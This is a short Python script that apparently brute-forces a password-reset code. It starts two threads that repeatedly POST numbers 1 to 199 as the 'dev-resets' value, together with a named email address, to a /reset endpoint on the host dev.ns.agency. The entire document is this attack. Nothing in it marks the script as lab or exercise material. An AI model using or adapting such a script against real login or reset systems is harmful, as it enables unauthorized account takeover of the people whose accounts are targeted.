#!/usr/bin/python3 

import sys, re
import _thread 
import time 
import requests 

def brute_force(num1, num2, delay):
	count = 0
	while count < 5: 
		time.sleep(delay)
		print("**** starting ****")
		for number in range(num1, num2):
			r = requests.post("https://dev.ns.agency/reset", data={'dev-email':'john.military@ns.agency', 'dev-resets':number})
			print(number)
		count += 1 



if __name__ == "__main__":
	try: 
		_thread.start_new_thread( brute_force, (1, 100, 2))
		_thread.start_new_thread( brute_force, (101, 200, 4))
		
	except: 
		print("ERROR: thread failed to start")